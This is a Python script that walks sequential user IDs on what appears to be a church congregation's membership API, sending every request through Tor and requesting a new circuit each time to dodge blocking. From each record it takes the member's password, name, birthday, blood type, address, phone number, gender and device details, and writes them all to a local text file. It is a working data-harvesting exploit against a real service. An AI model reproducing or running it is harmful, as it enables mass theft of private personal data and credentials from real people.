import requests
import json
from stem import Signal
from stem.control import Controller

f = open("dataJemaat.txt","a")

def get_tor_session():
    session = requests.session()
    session.proxies = {}
    session.proxies['http'] = 'socks5h://127.0.0.1:9050'
    session.proxies['https'] = 'socks5h://127.0.0.1:9050'
    return session

def renew_connection():
        with Controller.from_port(port = 9051) as controller:
            controller.authenticate(password="newpass175")
            controller.signal(Signal.NEWNYM)

for i in range(98760,101912):
    # 98760 to 101912 for Bandung
    # 98394 to 98758 for Kedoya
    # 102905 to 103280 for Tasikmalaya
    session = get_tor_session()
    renew_connection()
    URL = "http://shiftsoft.org:9000/gbibethelbandung/api/user/"+str(i)+"/id?"

    r = session.get(url = URL)

    # UNCOMMENT FOR IP CHANGING TEST
    # try:
    #     r = session.get('http://httpbin.org/ip')
    # except Exception as e:
    #     print(str(e))
    # else:
    #     print(r.text)
    # END OF IP CHANGING TEST

    # UNCOMMENT FOR USERID SEARCH
    # data = json.loads(r.text)
    # noData = "Sorry, Member Not Found"

    # if data['message'] != noData:
    #     print(str(i*100)+" is available!")
    #     print(data)
    # else:
    #     print(str(i*100)+" nah..")
    # END OF USERID SEARCH

    data = json.loads(r.text)

    try:
        userId = data['data']['ID']
    except (KeyError, NameError):
        userId = ""

    try:
        pwd = data['data']['Password']
    except (KeyError, NameError):
        pwd = ""

    try:
        cardNum = data['data']['Nickname']
    except (KeyError, NameError):
        cardNum = ""

    try:
        name = data['data']['Name']
    except (KeyError, NameError):
        name = ""

    try:
        bd = data['data']['Birthday']
    except (KeyError, NameError):
        bd = ""

    try:
        bloodType = data['data']['SpecialAttrs']['Golongan_Darah']
    except (KeyError, NameError):
        bloodType = ""

    try:
        adr = data['data']['Address']
    except (KeyError, NameError):
        adr = ""

    try:
        cmt = data['data']['SpecialAttrs']['Kecamatan']
    except (KeyError, NameError):
        cmt = ""

    try:
        lrh = data['data']['SpecialAttrs']['Kelurahan_/_Desa']
    except (KeyError, NameError):
        lrh = ""

    try:
        phone = data['data']['Phone1']
    except (KeyError, NameError):
        phone = ""

    try:
        stat = data['data']['Status']
    except (KeyError, NameError):
        stat = ""

    try:
        gender = data['data']['Gender']
    except (KeyError, NameError):
        gender = ""

    try:
        stlt = data['data']['SpecialAttrs']['Satelit_Ibadah']
    except (KeyError, NameError):
        stlt = ""

    try:
        device = data['data']['DeviceInformation']
    except (KeyError, NameError):
        device = ""
    
    line = str(userId)  +";"+ \
            cardNum     +";"+ \
            pwd         +";"+ \
            name        +";"+ \
            bd          +";"+ \
            bloodType   +";"+ \
            adr         +";"+ \
            cmt         +";"+ \
            lrh         +";"+ \
            phone       +";"+ \
            str(stat)   +";"+ \
            str(gender) +";"+ \
            stlt        +";"+ \
            device     

    f.write(line+"\n")  

    print(cardNum+" "+name)

f.close()